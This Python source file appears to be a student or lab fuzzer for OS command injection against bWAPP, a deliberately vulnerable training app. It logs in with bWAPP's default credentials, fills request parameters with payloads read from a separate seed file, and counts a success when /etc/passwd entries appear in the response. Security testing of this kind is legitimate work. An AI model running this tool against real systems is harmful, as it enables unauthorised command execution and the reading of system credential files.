import os
# import requests
import pycurl
import json
from io import BytesIO
import copy
import urllib.parse
import time
import re


class Osci:
    count = 0

    def __init__(self, method, attack_url, params, path):


        idx = 0
        for k in range(len(attack_url[7:])):
            if attack_url[k+7] == "/":
                idx = k+7
                break

        loginfo = {"login": "bee", "password": "bug", "security_level": "0", "form": "submit"}
        loginUrl = attack_url[:idx]+"/bWAPP/login.php"
        print(attack_url)
        print(loginUrl)

        self.C = pycurl.Curl()
        self.url = attack_url  # 공격 대상
        self.C.setopt(self.C.COOKIEJAR, 'cookie.txt')
        self.C.setopt(self.C.POST, True)
        self.C.setopt(self.C.FOLLOWLOCATION, 1)
        buf = BytesIO()
        self.C.setopt(self.C.WRITEDATA, buf)
        self.C.setopt(self.C.POSTFIELDS, urllib.parse.urlencode(loginfo))
        self.C.setopt(self.C.URL, loginUrl)

        self.C.perform()

        time.sleep(1)

        self.temp = {}
        self.mut = {}

        self.method = method  # HTTP METHOD
        self.par = params  # 파라미터
        self.c = pycurl.Curl()
        self.c.setopt(self.c.FOLLOWLOCATION, 1)
        self.c.setopt(self.c.COOKIEFILE, 'cookie.txt')
        self.c.setopt(self.c.COOKIEJAR, 'cookie.txt')
        self.buffer = BytesIO()
        self.c.setopt(self.c.WRITEDATA, self.buffer)
        self.c.setopt(self.c.VERBOSE, 0)
        if method == "GET":
            self.c.setopt(self.c.HTTPGET, True)
            self.c.setopt(self.c.POST, False)
        else:
            self.c.setopt(self.c.URL, attack_url)
            self.c.setopt(self.c.POST, True)
            self.c.setopt(self.c.HTTPGET, False)

        self.seed = open(path, "r",encoding='UTF-8')  # 시드파일 경로

        tmp = self.seed.readlines()
        self.seed.close()
        self.seed = tmp

    def StartFuzz(self):
        self.Fuzz(self.seed[0].rstrip('\n'))
        #for i in self.seed:
        #    if i != "\n":
        #        self.Fuzz(i.rstrip('\n'))

    def Fuzz(self, vector):
        self.mut = self.InsertSeed(vector)
        if (self.method == "GET"):
            a =  self.url + '?' + urllib.parse.urlencode(self.mut)

            self.c.setopt(self.c.URL, a)

        else:  # (self.method == "POST"):
            print("woojung's url : ", self.url + '?' + urllib.parse.urlencode(self.mut))
            self.c.setopt(self.c.POSTFIELDS, urllib.parse.urlencode(self.mut))

        self.c.perform()
        self.res = self.buffer.getvalue()
        self.ResultProcess(self.res.decode('UTF-8'))

    def InsertSeed(self, vector):
        temp = copy.deepcopy(self.par)

        for i in temp.keys():
            # if "directory_traversal" in self.url :
            temp[i] = vector
        self.temp = temp
        return temp

    def Check(self, res):
        idx = 0
        # self.par.items : dict_items([('page', '$')])
        # idx : 'page'
        for i, j in self.par.items():
            if j == "$":
                idx = i
                break
        print('woojung_res : ', res)
        if res.find("Enter a domain name") != -1 :
            return 0
        if res.find("server can't find " + self.mut[idx]) != -1:
            return 0
        if res.find("root:x:0:0:root:") != -1 :
            return 1
        if res.find("daemon:x:1:1:daemon:") != -1 :
            return 1

        return 0

        

    def ResultProcess(self, res):
        # 결과 정리
        # format: "TYPE, #         Code            Success         Payload"
        Osci.count += 1
        r = self.c.getinfo(pycurl.HTTP_CODE)
        result_string = "{:<16}{:<16}{:<16}{}".format("dirt#" + str(Osci.count), r,
                                                      self.Check(res), self.temp)
        print(result_string)